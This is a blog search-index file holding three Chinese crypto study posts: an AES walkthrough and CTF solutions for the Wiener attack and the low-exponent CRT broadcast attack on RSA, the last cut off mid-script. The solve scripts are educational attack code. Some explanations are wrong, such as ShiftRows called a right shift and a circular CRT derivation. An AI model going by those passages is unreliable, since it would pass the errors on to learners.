<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AES大致介绍</title>
      <link href="/blog/2026/02/19/AES%E7%AE%80%E8%AE%B0/"/>
      <url>/blog/2026/02/19/AES%E7%AE%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>标签（空格分隔）： 未分类</p><hr><h2 id="AES大致介绍"><a href="#AES大致介绍" class="headerlink" title="AES大致介绍"></a>AES大致介绍</h2><table>    <tr>        <th>AES类型</th>        <th>密钥长度（位）</th>        <th>加密轮数</th>        <th>密钥长度（字节）</th>        <th>需要的子密钥总数</th>    </tr>    <tr>        <td>AES-128</td>        <td>128</td>        <td>10</td>        <td>16</td>        <td>11</td>    </tr>    <tr>        <td>AES-192</td>        <td>192</td>        <td>12</td>        <td>24</td>        <td>13</td>    </tr>    <tr>        <td>AES-256</td>        <td>256</td>        <td>14</td>        <td>32</td>        <td>15</td>    </tr></table><hr><h2 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">          密匙K                        密匙</span><br><span class="line">            |                 传输      |</span><br><span class="line">明文P -&gt;AES加密函数 - &gt; 密文C -------&gt;  解密 ---&gt; 明文</span><br></pre></td></tr></table></figure><hr><h3 id="开始加密"><a href="#开始加密" class="headerlink" title="开始加密"></a>开始加密</h3><p>开始加密<br>首先通过将已知明文进行一个判断，由于AES加密只能用16个字节，所以得分块情况进行加密，当进行加密的字节刚好是16字节的话正好，如果是少于16字节就必须要进行一个填充（按照自己的方式进行补充）。</p><h3 id="明文处理"><a href="#明文处理" class="headerlink" title="明文处理"></a>明文处理</h3><p>明文转化为ASCLL值。<br>然后再将16字节的明文放到一个状态矩阵里面，具体顺序如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入字节： b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 b10 b11 b12 b13 b14 b15</span><br><span class="line"> </span><br><span class="line">状态矩阵排列：</span><br><span class="line">      Column 0  Column 1  Column 2  Column 3</span><br><span class="line">Row 0:   b0       b4       b8       b12</span><br><span class="line">Row 1:   b1       b5       b9       b13</span><br><span class="line">Row 2:   b2       b6       b10      b14</span><br><span class="line">Row 3:   b3       b7       b11      b15</span><br></pre></td></tr></table></figure><hr><h3 id="密匙拓展"><a href="#密匙拓展" class="headerlink" title="密匙拓展"></a>密匙拓展</h3><p>先进行密匙转换为ASCLL值然后再进行排列<br>例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">密匙16进制:4D 79 53 65 63 72 65 74 4B 65 79 31 32 33 34 35</span><br><span class="line">w[0] = [4D, 79, 53, 65]</span><br><span class="line">w[1] = [63, 72, 65, 74]</span><br><span class="line">w[2] = [4B, 65, 79, 31]</span><br><span class="line">w[3] = [32, 33, 34, 35]</span><br></pre></td></tr></table></figure><p>注：<code>这是初始密匙k0</code></p><p>就是4个4个的分组排列。</p><p><code>然后进行判断!!!</code></p><p><code>如果 i % 4 == 0，执行特殊变换</code></p><p><code>如果i没有满足的话直接进行异或运算  w [ i ] = w [ i - 4 ] ⊕ w [ i-1 ]可以得到下一步的</code></p><p>特殊变换如下:</p><h4 id="循环左移"><a href="#循环左移" class="headerlink" title="循环左移"></a>循环左移</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始: [byte0, byte1, byte2, byte3]</span><br><span class="line">循环左移后: [byte1, byte2, byte3, byte0]</span><br></pre></td></tr></table></figure><hr><h4 id="沙盒替换"><a href="#沙盒替换" class="headerlink" title="沙盒替换"></a>沙盒替换</h4><p>由于1个16进制字节转为2进制就是8个字节，此时用这个16进制转为的2进制字节的高4位为行号（转为整数值进行查询），低四位为列号（转为整数值进行查询）。<br>如此重复将每个字将查询到的值进行替换。<br>沙盒数值如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">     0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">00: 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76</span><br><span class="line">10: CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0</span><br><span class="line">20: B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15</span><br><span class="line">30: 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75</span><br><span class="line">40: 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84</span><br><span class="line">50: 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF</span><br><span class="line">60: D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8</span><br><span class="line">70: 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2</span><br><span class="line">80: CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73</span><br><span class="line">90: 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB</span><br><span class="line">A0: E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79</span><br><span class="line">B0: E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08</span><br><span class="line">C0: BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A</span><br><span class="line">D0: 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E</span><br><span class="line">E0: E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF</span><br><span class="line">F0: 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16</span><br></pre></td></tr></table></figure><hr><h4 id="与Rcon-round-异或"><a href="#与Rcon-round-异或" class="headerlink" title="与Rcon[round]异或"></a>与Rcon[round]异或</h4><p>Rcon &#x3D; Round Constant，每轮一个常数。<br>Rcon[round] 是一个字：[RC[round], 0x00, 0x00, 0x00]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SubWord结果: [C3, 18, 96, 23]</span><br><span class="line">Rcon[1]:     [01, 00, 00, 00]</span><br><span class="line">            ⊕  ⊕  ⊕  ⊕</span><br><span class="line">结果:      [C2, 18, 96, 23]</span><br></pre></td></tr></table></figure><p>然后再与w[i-4]异或得到w[4]</p><hr><h3 id="加密开始"><a href="#加密开始" class="headerlink" title="加密开始"></a>加密开始</h3><hr><h4 id="初始轮"><a href="#初始轮" class="headerlink" title="初始轮"></a>初始轮</h4><p>初始状态进行异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">状态矩阵：    轮密钥K0：      异或结果：</span><br><span class="line">48 6F 53 6C  ⊕  4D 63 4B 32  =  05 0C 18 5E</span><br><span class="line">65 20 20 64  ⊕  79 72 65 33  =  1C 52 45 57</span><br><span class="line">6C 41 57 21  ⊕  53 65 79 34  =  3F 24 2E 15</span><br><span class="line">6C 45 6F 72  ⊕  65 74 31 35  =  09 31 5E 47</span><br></pre></td></tr></table></figure><h4 id="主循环轮"><a href="#主循环轮" class="headerlink" title="主循环轮"></a>主循环轮</h4><p><code>沙盒替换</code><br>和密匙的特殊处理中沙盒的一样</p><p>这里就不多进行阐述了</p><p><code>行移位</code><br>假设此时为第n行那么字符向右移动n位例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第0行：不移位 → [6B, FE, B8, 4A]</span><br><span class="line"> </span><br><span class="line">第1行：左移1字节 → [9C, 6F, 6E, 5B] → [6F, 6E, 5B, 9C]</span><br><span class="line"> </span><br><span class="line">第2行：左移2字节 → [76, 36, 95, 59] → [95, 59, 76, 36]</span><br><span class="line"> </span><br><span class="line">第3行：左移3字节 → [01, C7, 4A, 5B] → [5B, 01, C7, 4A]</span><br></pre></td></tr></table></figure><p><code>列混淆</code><br>首先是在进行行移位后的状态表列出来<br>例子如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6B FE B8 4A</span><br><span class="line">6F 6E 5B 9C</span><br><span class="line">95 59 76 36</span><br><span class="line">5B 01 C7 4A</span><br></pre></td></tr></table></figure><p>然后获得第一列的数值：<br>6B 6F 95 5B<br>然后对每一列运用矩阵乘法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">固定矩阵：</span><br><span class="line">02 03 01 01</span><br><span class="line">01 02 03 01</span><br><span class="line">01 01 02 03</span><br><span class="line">03 01 01 02</span><br></pre></td></tr></table></figure><p>新行0 &#x3D; (02·6B) ⊕ (03·6F) ⊕ (01·95) ⊕ (01·5B)<br>新行1 &#x3D; (01·6B) ⊕ (02·6F) ⊕ (03·95) ⊕ (01·5B)<br>新行2 &#x3D; (01·6B) ⊕ (01·6F) ⊕ (02·95) ⊕ (03·5B)<br>新行3 &#x3D; (03·6B) ⊕ (01·6F) ⊕ (01·95) ⊕ (02·5B)<br>先进行乘法运算然后再进行异或运算得到每一列</p><p>随后对每一列重复那样的计算<br><code>总结</code>：先提出一列然后对固定矩阵的每一行进行矩阵乘法后得到新列</p><p><code>轮密匙加密</code><br>与第n轮的密匙进行异或运算例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">状态：         轮密钥K1：     异或结果：</span><br><span class="line">AF 45 32 8D  ⊕  AD CF F7 E5  =  02 8A C5 68</span><br><span class="line">80 23 9E 4C  ⊕  E1 93 92 D1  =  61 B0 0C 9D</span><br><span class="line">C6 F1 5A B7  ⊕  F6 D7 2B F7  =  30 26 71 40</span><br><span class="line">FB DC 88 29  ⊕  46 77 15 32  =  BD AB 9D 1B</span><br></pre></td></tr></table></figure><p>这样一轮便是结束了<br>如此重复9轮</p><p><code>第10轮</code><br>只在前几轮的基础上去掉列混淆<br>最后输出结果便是加密方式</p><p>##总结<br>大致加密流程可以画成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">明文 → 轮密钥加(K0) </span><br><span class="line">      → [字节替换 → 行移位 → 列混淆 → 轮密钥加(Ki)] 循环9次</span><br><span class="line">      → 字节替换 → 行移位 → 轮密钥加(K10) </span><br><span class="line">      → 密文</span><br></pre></td></tr></table></figure><p>解密的流程是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">密文 → 轮密钥加(K10) </span><br><span class="line">      → 逆行移位 → 逆字节替换 </span><br><span class="line">      → [轮密钥加(Ki) → 逆列混淆 → 逆行移位 → 逆字节替换] 循环9次</span><br><span class="line">      → 轮密钥加(K0) </span><br><span class="line">      → 明文</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>维纳攻击(wiener attack)</title>
      <link href="/blog/2026/02/15/%E7%BB%B4%E7%BA%B3%E6%94%BB%E5%87%BB(wiener%20attack)/"/>
      <url>/blog/2026/02/15/%E7%BB%B4%E7%BA%B3%E6%94%BB%E5%87%BB(wiener%20attack)/</url>
      
        <content type="html"><![CDATA[<h1 id="维纳攻击-wiener-attack"><a href="#维纳攻击-wiener-attack" class="headerlink" title="维纳攻击(wiener attack)"></a>维纳攻击(wiener attack)</h1><p>标签（空格分隔）： RSA</p><hr><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>这是一个基于连分数的攻击<br>可以看看这个文章 <a href="https://zhuanlan.zhihu.com/p/1941091552979064076">连分数</a></p><p>wiener attack 是依靠连分数进行的攻击方式，适用于非常接近某一值（比如1）时，求一个比例关系，通过该比例关系再来反推关键信息就简单很多。</p><p>这种攻击对于解密指数d很小时有很好的效果，一般的用法是</p><p>通过ed mod φ(n)&#x3D;1</p><p>得到 ed&#x3D;k*φ(n)+1</p><p>即 e&#x2F;φ(n)&#x3D;k&#x2F;d+1&#x2F;φ(n)</p><p>这种情况下φ(n)≈n，且φ(n)非常大</p><p>所以有 e&#x2F;N - k&#x2F;d &#x3D; 1&#x2F;φ(n)，也就是说k&#x2F;d与e&#x2F;N非常接近，而e&#x2F;N又是已知的</p><p>对e&#x2F;N进行连分数展开，得到的一串分数的分母很有可能就是d</p><p>然后基于这个，列出的$[a_0,a_1,…a_i]$ 反推 形成的完整分数的分子,分母$p_i,q_i$<br>此时有个定义</p><center>$p_0 = 0,p_1 = 1$</center><center>$q_0 = 1,q_1 = 0$</center><p>然后递推公式是<br>$pᵢ &#x3D; aᵢ × pᵢ₋₁ + pᵢ₋₂$<br>$qᵢ &#x3D; aᵢ × qᵢ₋₁ + qᵢ₋₂$<br>此时可以一直递推然后获得d的疑似值，在进行验证，便爆破出了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from secret import flag</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)   #取个512比特的随机质数</span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-1) * (q-1)</span><br><span class="line">while True:</span><br><span class="line">    d = getRandomNBitInteger(200)  #生成恰好为200比特的随机数</span><br><span class="line">    if GCD(d, phi) == 1:</span><br><span class="line">        e = inverse(d, phi)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">c = pow(m, e, N)</span><br><span class="line"></span><br><span class="line">print(c, e, N, sep=&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"># 37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span><br><span class="line"># 46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span><br><span class="line"># 86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from RSAwienerHacker import hack_RSA</span><br><span class="line">import libnum</span><br><span class="line">e=46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span><br><span class="line">n=86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span><br><span class="line">d=hack_RSA(e,n)</span><br><span class="line">print(d)</span><br><span class="line">enc=37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span><br><span class="line">m=pow(enc ,d ,n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低加密指数广播攻击（CRT）</title>
      <link href="/blog/2026/02/13/%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB%EF%BC%88CRT%EF%BC%89/"/>
      <url>/blog/2026/02/13/%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB%EF%BC%88CRT%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="低加密指数广播攻击（CRT）"><a href="#低加密指数广播攻击（CRT）" class="headerlink" title="低加密指数广播攻击（CRT）"></a>低加密指数广播攻击（CRT）</h1><p>标签（空格分隔）： RSA</p><hr><h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2><p>中国剩余定律：如果模数$n_1,n_2,n_3,…n_i$两两互素，<br>且满足:</p><hr><center> $x ≡ c_1 \ mod \ n_1$ </center><center> $x ≡ c_2 \ mod \ n_2$ </center><center> ....... </center><center> $x ≡ c_i \ mod \ n_i$ </center><hr><p>那么在模 $ N&#x3D;x_1<em>x_2</em>…*x_i $ 下有唯一解x，那么所有解 $X$ 在模 $N$ 下都等于 $x \ mod \ N$<br>我们需要得到x的话就必须得去构造一个值能完全满足</p><hr><center> $x ≡ c_1 \ mod \ n_1$ </center><center> $x ≡ c_2 \ mod \ n_2$ </center><center> ....... </center><center> $x ≡ c_i \ mod \ n_i$ </center><hr><p>引入$t_i&#x3D;inverse(N&#x2F;&#x2F;c_i * t_i,N)$</p><p>此时我们想到$x &#x3D; k*n_1 + c_1$,在知道$c_1,c_2,…c_i$的情况下一直带入进去套换的话可以表示出来但是相当的长且麻烦</p><p>这里引入基$e_i$，这个$e_i$基等于 $N&#x2F;&#x2F;c_i * t_i$，此时保证了这个$e_i*c_i$在取模为$c_i$时为$c_i$<code>因为e≡1 mod N</code></p><p>那么同时构造与$i$同样个数的$e_i$组成了</p><center>$e_1*c_1+e_2*c_2+...+e_i*c_i ≡ X\ mod \ N $</center>`可以自己心算一下是否正确`<p>这就是攻击的原理</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Util.Padding import *</span><br><span class="line"></span><br><span class="line">FLAG = bytes_to_long(pad(b&quot;flag&#123;??????&#125;&quot;,64))</span><br><span class="line">def init_key():</span><br><span class="line">    p, q = getPrime(512), getPrime(512)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = 9</span><br><span class="line">    while(GCD((p-1)*(q-1),e)!=1):</span><br><span class="line">        p, q = getPrime(512), getPrime(512)</span><br><span class="line">        n = p*q</span><br><span class="line">    d = inverse(e,(p-1)*(q-1))</span><br><span class="line">    return n,e,d</span><br><span class="line"></span><br><span class="line">n_list=list()</span><br><span class="line">c_list=list()</span><br><span class="line">for i in range(9):</span><br><span class="line">    N,e,d=init_key()</span><br><span class="line">    n_list.append(N)</span><br><span class="line">    c=pow(FLAG,e,N)</span><br><span class="line">    c_list.append(pow(FLAG,e,N))</span><br><span class="line">    assert(pow(c,d,N)==FLAG)</span><br><span class="line">print(&quot;n_list:&quot;,n_list)</span><br><span class="line">print(&quot;c_list:&quot;,c_list)</span><br><span class="line">##output:n_list: [71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799, 92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949, 100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919, 59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847, 66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147, 120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377, 72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281, 69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951, 76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]</span><br><span class="line">##c_list: [62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585, 46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900, 85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198, 14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656, 1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839, 2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981, 16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376, 31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996, 25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里和我上面说的类似，通过构造$e_1<em>c_1+e_2</em>c_2+…+e_i*c_i$来推导flag，exp如下</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">n_list = [</span><br><span class="line">   71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799,</span><br><span class="line">   92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949,</span><br><span class="line">   100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919,</span><br><span class="line">   59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847,</span><br><span class="line">   66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147,</span><br><span class="line">   120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377,</span><br><span class="line">   72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281,</span><br><span class="line">   69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951,</span><br><span class="line">   76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]</span><br><span class="line">c_list = [</span><br><span class="line">   62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585,</span><br><span class="line">   